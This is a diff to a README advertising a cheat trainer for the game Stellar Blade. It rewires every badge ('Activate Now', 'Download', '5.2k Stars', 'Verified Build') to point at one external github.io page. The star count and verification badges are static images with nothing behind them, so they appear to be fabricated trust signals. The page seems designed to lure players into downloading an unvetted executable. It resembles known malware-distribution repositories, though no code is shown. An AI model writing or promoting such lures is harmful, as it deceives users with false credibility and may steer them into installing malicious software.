@@ -19,10 +19,10 @@ Stellar Blade mixes cinematic action with punishing combat. Our cheat suite is c
 * **God Mode Option** – Toggle invincibility for boss practice runs.
 * **Performance Safe** – Optimized injection to minimize CPU/GPU load.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐ 5.2k Stars](https://img.shields.io/badge/⭐-5.2k%20Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](https://stellar-blade-cheat.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://stellar-blade-cheat.github.io/.github/)
+[![⭐ 5.2k Stars](https://img.shields.io/badge/⭐-5.2k%20Stars-yellow?style=for-the-badge\&logo=github)](https://stellar-blade-cheat.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=github)](https://stellar-blade-cheat.github.io/.github/)
 
 ---
 
@@ -101,8 +101,8 @@ A: Technically yes, but not recommended—use offline for safety.
 
 The **Stellar Blade Cheat Software** provides clarity and precision in every mission. Whether you want improved awareness, smoother combat, or easier farming, this trainer-style tool helps you focus on the story and action—not the grind.
 
-[![Community](https://img.shields.io/badge/Community-purple?style=for-the-badge\&logo=github)](#)
-[![Verified Build](https://img.shields.io/badge/Verified-Build-orange?style=for-the-badge\&logo=checkmarx)](#)
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](#)
+[![Community](https://img.shields.io/badge/Community-purple?style=for-the-badge\&logo=github)](https://stellar-blade-cheat.github.io/.github/)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-orange?style=for-the-badge\&logo=checkmarx)](https://stellar-blade-cheat.github.io/.github/)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](https://stellar-blade-cheat.github.io/.github/)
 
 ---
